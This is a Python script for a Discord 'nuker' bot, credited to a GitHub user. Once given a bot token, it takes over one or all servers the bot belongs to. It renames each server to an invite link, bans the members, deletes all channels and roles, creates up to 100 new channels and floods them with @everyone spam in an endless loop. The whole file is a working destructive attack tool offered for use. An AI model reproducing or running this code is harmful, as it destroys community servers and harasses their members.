from asyncio import WriteTransport
import discord
from discord.ext import commands
from pystyle import *
import os
from sys import exit    

banner = '''
 _   _       _        ____        _   
| \ | |_   _| | _____| __ )  ___ | |_ 
|  \| | | | | |/ / _ \  _ \ / _ \| __|
| |\  | |_| |   <  __/ |_) | (_) | |_ 
|_| \_|\__,_|_|\_\___|____/ \___/ \__|
Made by: https://github.com/catcha8'''[1:]

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
            Write.Print(f"{deleted} {channel} channel got deleted\n", Colors.purple_to_blue, interval=0)
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
            Write.Print(f"{deleted} role {role} got deleted\n", Colors.purple_to_blue, interval=0)
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
            Write.Print(f"{banned} {member} got banned\n", Colors.purple_to_blue, interval=0)
        except:
            continue
    return banned

async def create_txt_channels(guild, name):
    global channel
    created = 0
    for _ in range(100 - len(guild.channels)):
        try:
            channel = await guild.create_text_channel(name=name)
            created += 1
            Write.Print(f"{created} {name} channel got created\n", Colors.purple_to_blue, interval=0)
        except:
            continue   
    return created

async def spam_all_channels(guild):
    while True:
        for channel in guild.channels:
            await channel.send("@everyone __*Nuked by catcha80#2887* https://github.com/catcha8/Discord-NukerV2\nJoin my discord ;)  https://discord.gg/RdVX95ysyA __")


async def nuke_guild(guild):
    Write.Print(f'Nuke: {guild.name}\n', Colors.red_to_purple, interval=0)
    Write.Print(f'Updating guild name\n', Colors.red_to_purple, interval=0)
    await guild.edit(name="https://discord.gg/RdVX95ysyA")
    banned = await ban_all_members(guild)
    Write.Print(f'Banned:{banned}\n', Colors.red_to_purple, interval=0)
    deleted_channels = await delete_all_channel(guild)
    Write.Print(f'Delete Channels:{deleted_channels}\n', Colors.red_to_purple, interval=0)
    delete_roles = await delete_all_roles(guild)
    Write.Print(f'Delete Roles:{delete_roles}\n', Colors.red_to_purple, interval=0)
    created_channels = await create_txt_channels(guild,name)
    Write.Print(f'Create text Channels:{created_channels}\n', Colors.red_to_purple, interval=0)
    Write.Print("Spamming the whole server !\n", Colors.red_to_purple, interval=0)
    await spam_all_channels(guild)
    Write.Print(f'--------------------------------------------\n\n', Colors.red_to_purple, interval=0)


Anime.Fade(Center.Center(banner), Colors.red_to_blue, Colorate.Vertical, interval=0.01, enter=True)   

while True:
    os.system("cls" or "clear")
    choice = Write.Print(f'''              
--------------------------------------------
[Menu]
    └─[1] - Run Setup Nuke Bot
    └─[2] - Exit
====>''', Colors.red_to_blue, interval=0)

    choice = Write.Input("", Colors.red_to_blue, interval=0)
    if choice == '1':
        token = Write.Input("Input bot token \n>", Colors.blue, interval=0 )
        os.system("cls" or "clear")
        Write.Print(f'Input name for created channels :\n', Colors.blue_to_red, interval=0)
        name = Write.Input("\n>", Colors.blue, interval=0)
        os.system("cls" or "clear")
        Write.Print(f'''

                
--------------------------------------------
[Select]
    └─[1] - Nuke of all servers.
    └─[2] - Nuke only one server.  
    └─[3] - Exit
====>''', Colors.blue_to_red, interval=0)

        choice_type = Write.Input(">", Colors.red_to_purple, interval=0)
        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Logged as {client.user.name}
[+]Bot in {len(client.guilds)} servers!''')
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()
        elif choice_type == '2':
            guild_id =  Write.Input('Input server id >', Colors.blue_to_cyan, interval=0)
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild)
                await client.close()
        elif choice_type == '3':
            print(f'Exit...')
            exit()
        try:
            client.run(token)
            input('Nuke finished, press enter for return to menu...')
        except Exception as error:
            if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                input(f'Intents Error\nFor fix -> https://prnt.sc/wmrwut\nPress enter for return...')
            else:
                input(f'{error}\nPress enter for return...')
            continue
    elif choice == '2':
        print(f'Exit...')
        exit()
